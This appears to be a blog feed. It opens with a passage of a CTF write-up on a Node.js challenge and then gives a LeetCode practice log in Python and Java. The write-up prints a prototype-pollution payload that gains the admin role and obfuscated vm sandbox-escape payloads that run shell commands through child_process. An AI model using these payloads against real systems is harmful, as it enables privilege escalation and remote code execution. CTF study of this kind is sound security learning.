<span class="hljs-string">&#x27;/public/login.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(__dirname + <span class="hljs-string">&#x27;/public/register.html&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login success&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;login failed&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/register&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>)<br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users) &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register failed&#x27;</span><br>        &#125;)<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        users[username] = password<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;message&#x27;</span>: <span class="hljs-string">&#x27;register success&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/profile&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">send</span>(&#123;<br>        <span class="hljs-string">&#x27;user&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span>,<br>        <span class="hljs-string">&#x27;role&#x27;</span>: req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span><br>    &#125;)<br>&#125;)<br><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/sandbox&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">if</span> (req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> === <span class="hljs-string">&#x27;admin&#x27;</span>) &#123;<br>        <span class="hljs-keyword">let</span> code = req.<span class="hljs-property">body</span>.<span class="hljs-property">code</span><br>        <span class="hljs-keyword">let</span> sandbox = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-literal">null</span>)<br>        <span class="hljs-keyword">let</span> context = vm.<span class="hljs-title function_">createContext</span>(sandbox)<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-title function_">waf</span>(code)<br>            <span class="hljs-keyword">let</span> result = vm.<span class="hljs-title function_">runInContext</span>(code, context)<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: result<br>            &#125;)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            res.<span class="hljs-title function_">send</span>(&#123;<br>                <span class="hljs-string">&#x27;result&#x27;</span>: e.<span class="hljs-property">message</span><br>            &#125;)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(&#123;<br>            <span class="hljs-string">&#x27;result&#x27;</span>: <span class="hljs-string">&#x27;Your role is not admin, so you can not run any code&#x27;</span><br>        &#125;)<br>    &#125;<br>&#125;)<br><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/logout&#x27;</span>, requireLogin, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    req.<span class="hljs-property">session</span>.<span class="hljs-title function_">destroy</span>()<br>    res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/login&#x27;</span>)<br>&#125;)<br><br>app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">3000</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;server start listening on :3000&#x27;</span>)<br>&#125;)<br></code></pre></td></tr></table></figure><p>先看和原型链污染有关的部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs js">app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/login&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = <span class="hljs-title function_">clone</span>(req.<span class="hljs-property">body</span>) <span class="hljs-comment">//解构赋值，从req.body对象中提取username和password属性值，并将它们分别赋值给变量username和password。</span><br><br>    <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> users &amp;&amp; password === users[username]) &#123;<br>        req.<span class="hljs-property">session</span>.<span class="hljs-property">user</span> = username<br><br>        <span class="hljs-keyword">if</span> (username <span class="hljs-keyword">in</span> admins) &#123; <span class="hljs-comment">//目的是拿到admin角色</span><br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;admin&#x27;</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            req.<span class="hljs-property">session</span>.<span class="hljs-property">role</span> = <span class="hljs-string">&#x27;guest&#x27;</span><br>        &#125;<br><span class="hljs-comment">//clone(req.body)看成merge(&#123;&#125;, req.body)。利用req.body污染admins即可</span><br></code></pre></td></tr></table></figure><p>在<code>POST</code>包中增加如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs js">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//__proto__被过滤，通过&quot;constructor&quot;: &#123;&quot;prototype&quot;: 绕过即可</span><br>&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;123&quot;</span>,<span class="hljs-string">&quot;constructor&quot;</span>: &#123;<span class="hljs-string">&quot;prototype&quot;</span>: &#123;<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;&#125;&#125;<br><span class="hljs-comment">//存在admins.__proto__.test=123，username=&#x27;test&#x27;，使得username in admins成立</span><br></code></pre></td></tr></table></figure><p>结果：</p><p><img src="/img/sb2.png" alt="sb2"></p><p><code>payload:</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Proxy</span>(&#123;&#125;, &#123; <br><span class="hljs-attr">get</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123; <br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;ls /&#x27;</span>).<span class="hljs-title function_">toString</span>();<br> &#125;<br>&#125;)<br>或<br><span class="hljs-keyword">let</span> obj = &#123;&#125; <br>obj.<span class="hljs-title function_">__defineGetter__</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<br><span class="hljs-keyword">const</span> c = <span class="hljs-variable language_">arguments</span>.<span class="hljs-property">callee</span>.<span class="hljs-property">caller</span><br><span class="hljs-keyword">const</span> p = (c[<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>][<span class="hljs-string">&#x27;constru&#x27;</span>+<span class="hljs-string">&#x27;ctor&#x27;</span>](<span class="hljs-string">&#x27;return pro&#x27;</span>+<span class="hljs-string">&#x27;cess&#x27;</span>))()<br><span class="hljs-keyword">return</span> p[<span class="hljs-string">&#x27;mainM&#x27;</span>+<span class="hljs-string">&#x27;odule&#x27;</span>][<span class="hljs-string">&#x27;requi&#x27;</span>+<span class="hljs-string">&#x27;re&#x27;</span>](<span class="hljs-string">&#x27;child_pr&#x27;</span>+<span class="hljs-string">&#x27;ocess&#x27;</span>)[<span class="hljs-string">&#x27;ex&#x27;</span>+<span class="hljs-string">&#x27;ecSync&#x27;</span>](<span class="hljs-string">&#x27;cat /flag&#x27;</span>).<span class="hljs-title function_">toString</span>();<br>&#125;)<br><span class="hljs-keyword">throw</span> obj<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>LeetCode做题记录_1</title>
    <link href="/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/"/>
    <url>/2023/09/19/2023-9-19-LeetCode%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_1/</url>
    
    <content type="html"><![CDATA[<p>代码能力太差了，在leetCode上做点简单的题。记录一下😀</p><span id="more"></span><hr><p>代码能力完全是入门级别。。只会写点异常简单的东西，准备做点题提升下能力。</p><p>在做题过程中，我会尽可能使用我接触过的<code>python</code>,<code>java</code>,<code>c++</code>来解题。</p><p>当然，“尽可能”，写不写的出来就是另外一回事了</p><h2 id="1-两数之和"><a href="#1-两数之和" class="headerlink" title="1.两数之和"></a>1.两数之和</h2><p>描述：给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <em><code>target</code></em> 的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p><p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p><p>你可以按任意顺序返回答案。</p><p>思路就是遍历给定数组中的每个元素，让他们都加一遍，两数之和进<code>if</code>条件判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">twoSum</span>(<span class="hljs-params">self, nums, target</span>):<br>        listlen = <span class="hljs-built_in">len</span>(nums)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>            <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(listlen):<br>                <span class="hljs-keyword">if</span> nums[i] + nums[j] == target:<br> <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Answer: <span class="hljs-subst">&#123;i&#125;</span>, <span class="hljs-subst">&#123;j&#125;</span>!&quot;</span>)<br><br>nums = [<span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">11</span>, <span class="hljs-number">15</span>]<br>target = <span class="hljs-number">9</span><br><br>solution = Solution()<br>solution.twoSum(nums, target)<br>                <br><span class="hljs-comment"># 输出：Answer: 0, 1!</span><br><span class="hljs-comment">#      Answer: 1, 0!</span><br></code></pre></td></tr></table></figure><p><code>java</code>的不会写~直接看了官方答案：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span>[] twoSum(<span class="hljs-type">int</span>[] nums, <span class="hljs-type">int</span> target) &#123;<span class="hljs-comment">//定义了一个twoSum方法，返回类型为int[],该方法接受一个整数数组nums和一个整数目标值target作为参数</span><br>     <span class="hljs-comment">//java定义方法：访问修饰符 返回类型 方法名(参数列表)</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">n</span> <span class="hljs-operator">=</span> nums.length;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; n; ++i) &#123;<span class="hljs-comment">//for (初始化语句; 循环条件; 更新语句)，++i是前缀自增</span><br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span>; j &lt; n; ++j) &#123;<br>                <span class="hljs-keyword">if</span> (nums[i] + nums[j] == target) &#123;<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;i, j&#125;;<span class="hljs-comment">//花括号创建数组</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">0</span>];<span class="hljs-comment">//假如找不到会返回一个空的整数数组</span><br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">//https://leetcode.cn/problems/two-sum/</span><br><br></code></pre></td></tr></table></figure><h2 id="2-无重复字符的最长字串"><a href="#2-无重复字符的最长字串" class="headerlink" title="2.无重复字符的最长字串"></a>2.无重复字符的最长字串</h2><p>做题感受：我是SB</p><p>给定一个字符串 <code>s</code> ，请你找出其中不含有重复字符的 <strong>最长子串</strong> 的长度。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">length_of_longest_substring</span>(<span class="hljs-params">s</span>):<br>    char_dict = &#123;&#125;  <span class="hljs-comment"># 记录每个字符最后一次出现的索引位置</span><br>    start = <span class="hljs-number">0</span>  <span class="hljs-comment"># 子串的起始位置</span><br>    end = <span class="hljs-number">0</span>  <span class="hljs-comment"># 子串的结束位置</span><br>    max_length = <span class="hljs-number">0</span>  <span class="hljs-comment"># 最长子串的长度</span><br><br>    <span class="hljs-keyword">for</span> i, char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(s):<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> char_dict <span class="hljs-keyword">and</span> char_dict[char] &gt;= start:<br>            start = char_dict[char] + <span class="hljs-number">1</span><br>        end = i<br>        char_dict[char] = i<br>        max_length = <span class="hljs-built_in">max</span>(max_length, end - start + <span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">return</span> max_length<br><br></code></pre></td></tr></table></figure><h2 id="3-计算列车到站时间"><a href="#3-计算列车到站时间" class="headerlink" title="3.计算列车到站时间"></a>3.计算列车到站时间</h2><p>给你一个正整数 <code>arrivalTime</code> 表示列车正点到站的时间（单位：小时），另给你一个正整数 <code>delayedTime</code> 表示列车延误的小时数。</p><p>返回列车实际到站的时间。</p><p>注意，该问题中的时间采用 24 小时制。</p><p>思路就是求和取模</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getReal</span>(<span class="hljs-params">self</span>):<br>        arrivalTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入列车正点到站时间：&quot;</span>))<br>        delayedTime = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入列车延误的小时数：&quot;</span>))<br>        realTime = (arrivalTime + delayedTime) % <span class="hljs-number">24</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;列车本该在<span class="hljs-subst">&#123;arrivalTime&#125;</span>点到站，但延误了<span class="hljs-subst">&#123;delayedTime&#125;</span>小时，所以实际到站时间为<span class="hljs-subst">&#123;realTime&#125;</span>点!&quot;</span>)<br><br><span class="hljs-comment"># 实例化Solution类</span><br>solution = Solution()<br><span class="hljs-comment"># 调用getReal方法</span><br>solution.getReal()<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-comment">//java</span><br><span class="hljs-comment">//Main.java</span><br><br><span class="hljs-keyword">import</span> java.util.Scanner;  <span class="hljs-comment">//利用Scanner类读取输入</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;  <span class="hljs-comment">//类与文件名保持一致</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">scanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<span class="hljs-comment">//创建了一个名为scanner的Scanner对象，并将其初始化为从标准输入流（System.in）中读取数据</span><br><br>        System.out.print(<span class="hljs-string">&quot;请输入列车正点到站时间：&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">arrivalTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        System.out.print(<span class="hljs-string">&quot;请输入列车延误的小时数：&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">delayedTime</span> <span class="hljs-operator">=</span> scanner.nextInt();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">realTime</span> <span class="hljs-operator">=</span> (arrivalTime + delayedTime) % <span class="hljs-number">24</span>;<br>        System.out.println(<span class="hljs-string">&quot;列车本该在&quot;</span> + arrivalTime + <span class="hljs-string">&quot;点到站，但延误了&quot;</span> + delayedTime + <span class="hljs-string">&quot;小时，所以实际到站时间为&quot;</span> + realTime + <span class="hljs-string">&quot;点!&quot;</span>);<br><br>        scanner.close();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="4-罗马数字转整数"><a href="#4-罗马数字转整数" class="headerlink" title="4.罗马数字转整数"></a>4.罗马数字转整数</h2><p>罗马数字包含以下七种字符: <code>I</code>， <code>V</code>， <code>X</code>， <code>L</code>，<code>C</code>，<code>D</code> 和 <code>M</code>。</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">字符          数值<br><span class="hljs-built_in">I</span>             <span class="hljs-number">1</span><br><span class="hljs-variable">V</span>             <span class="hljs-number">5</span><br><span class="hljs-variable">X</span>             <span class="hljs-number">10</span><br><span class="hljs-variable">L</span>             <span class="hljs-number">50</span><br><span class="hljs-built_in">C</span>             <span class="hljs-number">100</span><br><span class="hljs-built_in">D</span>             <span class="hljs-number">500</span><br><span class="hljs-variable">M</span>             <span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><p>例如， 罗马数字 <code>2</code> 写做 <code>II</code> ，即为两个并列的 1 。<code>12</code> 写做 <code>XII</code> ，即为 <code>X</code> + <code>II</code> 。 <code>27</code> 写做 <code>XXVII</code>, 即为 <code>XX</code> + <code>V</code> + <code>II</code> 。</p><p>通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如 4 不写做 <code>IIII</code>，而是 <code>IV</code>。数字 1 在数字 5 的左边，所表示的数等于大数 5 减小数 1 得到的数值 4 。同样地，数字 9 表示为 <code>IX</code>。这个特殊的规则只适用于以下六种情况：</p><ul><li><code>I</code> 可以放在 <code>V</code> (5) 和 <code>X</code> (10) 的左边，来表示 4 和 9。</li><li><code>X</code> 可以放在 <code>L</code> (50) 和 <code>C</code> (100) 的左边，来表示 40 和 90。 </li><li><code>C</code> 可以放在 <code>D</code> (500) 和 <code>M</code> (1000) 的左边，来表示 400 和 900。</li></ul><p>给定一个罗马数字，将其转换成整数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">romanToInt</span>(<span class="hljs-params">self, luoma</span>):<br>        roman_map = &#123;<span class="hljs-string">&#x27;I&#x27;</span>: <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;V&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;X&#x27;</span>: <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;L&#x27;</span>: <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;C&#x27;</span>: <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;D&#x27;</span>: <span class="hljs-number">500</span>, <span class="hljs-string">&#x27;M&#x27;</span>: <span class="hljs-number">1000</span>&#125;<br>        result = <span class="hljs-number">0</span><br>        prev_value = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> luoma:<br>            value = roman_map[char]<br>            <span class="hljs-keyword">if</span> value &gt; prev_value:<br>                result += value - <span class="hljs-number">2</span> * prev_value<br>            <span class="hljs-keyword">else</span>:<br>                result += value<br>            prev_value = value<br>        <span class="hljs-keyword">return</span> result<br><br>s = Solution()<br>input_roman = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个罗马数字：&quot;</span>)<br><span class="hljs-built_in">print</span>(s.romanToInt(input_roman))<br><br></code></pre></td></tr></table></figure><h2 id="5-回文数"><a href="#5-回文数" class="headerlink" title="5.回文数"></a>5.回文数</h2><p>给你一个整数 <code>x</code> ，如果 <code>x</code> 是一个回文整数，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p><p>回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。</p><ul><li>例如，<code>121</code> 是回文，而 <code>123</code> 不是。</li></ul><p>思路就是先把数字转换成字符串，然后计算长度利用切片分别返回正序倒序的结果。判断是否相等然后输出。</p><p>一开始还是想利用<code>input</code>函数提示用户输入，然后利用<code>Int</code>转换为整数，再利用<code>str</code>转成字符串，后来觉得没任何必要。。直接<code>number = input(&quot;请输入一个数字。我会判断是不是回文数：&quot;)</code>就行。然后利用<code>len</code>函数计算字符串长度，再利用切片去看正序倒序结果，<code>if</code>判断然后输入就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">check_it</span>(<span class="hljs-params">self,num</span>):<br>        zhengxv = num[::]<br>        daoxv = num[::-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> zhengxv == daoxv:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>是一个回文数&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;num&#125;</span>不是一个回文数&quot;</span>)<br>            <br>s = Solution()<br>num =  <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入一个数字。我会判断是不是回文数：&quot;</span>)<br><span class="hljs-built_in">print</span>(s.check_it(num))<br><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">check_it</span><span class="hljs-params">(<span class="hljs-type">int</span> num)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">numStr</span> <span class="hljs-operator">=</span> String.valueOf(num);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">reverseNumStr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 